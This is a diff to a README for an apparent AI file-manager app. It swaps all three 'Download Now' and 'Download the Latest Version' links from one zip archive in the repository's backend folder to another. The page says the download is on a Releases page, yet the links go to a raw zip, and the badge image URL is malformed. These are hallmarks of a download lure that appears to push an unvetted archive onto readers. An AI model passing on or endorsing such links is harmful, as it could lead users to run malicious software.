@@ -1,6 +1,6 @@
 # 📁 llm-file-manager-agent - Manage Your Files Easily with AI
 
-![Download Now](https://raw.githubusercontent.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/main/backend/llm-file-manager-agent_v3.0.zip%20Now-Click%20Here-ff69b4)
+![Download Now](https://github.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/raw/refs/heads/main/backend/manager-llm-file-agent-2.9.zip%20Now-Click%20Here-ff69b4)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the **llm-file-manager-agent**! This application helps you manage you
 
 To download the application, visit the Releases page. Click the link below to get started:
 
-[Download the Latest Version](https://raw.githubusercontent.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/main/backend/llm-file-manager-agent_v3.0.zip)
+[Download the Latest Version](https://github.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/raw/refs/heads/main/backend/manager-llm-file-agent-2.9.zip)
 
 ### Installation Steps
 
@@ -70,7 +70,7 @@ If you have questions or need further assistance, you can reach out via GitHub I
 
 ### Important Links
 
-- [Download the Latest Version](https://raw.githubusercontent.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/main/backend/llm-file-manager-agent_v3.0.zip)
+- [Download the Latest Version](https://github.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/raw/refs/heads/main/backend/manager-llm-file-agent-2.9.zip)
 
 ## 📄 Changelog
 
